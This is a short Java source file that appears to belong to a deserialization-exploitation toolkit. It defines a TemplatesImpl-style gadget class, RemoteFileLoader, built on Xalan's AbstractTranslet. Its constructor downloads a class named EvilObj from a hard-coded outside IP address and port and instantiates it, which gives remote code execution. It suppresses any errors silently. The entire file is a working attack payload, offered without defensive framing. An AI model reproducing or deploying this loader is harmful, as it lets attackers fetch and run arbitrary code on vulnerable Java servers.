package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author wh1t3P1g
 * @since 2021/7/1
 */
public class RemoteFileLoader extends AbstractTranslet implements Serializable {

    private static String url;
    private static String classname;

    public RemoteFileLoader() {
        try{
            transletVersion = 101;
            URL[] urls = new URL[]{new URL(url)};
            URLClassLoader classloader = URLClassLoader.newInstance(urls);
            Class<?> clazz = classloader.loadClass(classname);
            clazz.newInstance();
        }catch (Exception e){

        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    static {
        url = "http://129.211.89.169:1098/EvilObj.class";
        classname = "EvilObj";
    }

    public static void main(String[] args) {
        RemoteFileLoader loader = new RemoteFileLoader();
    }
}
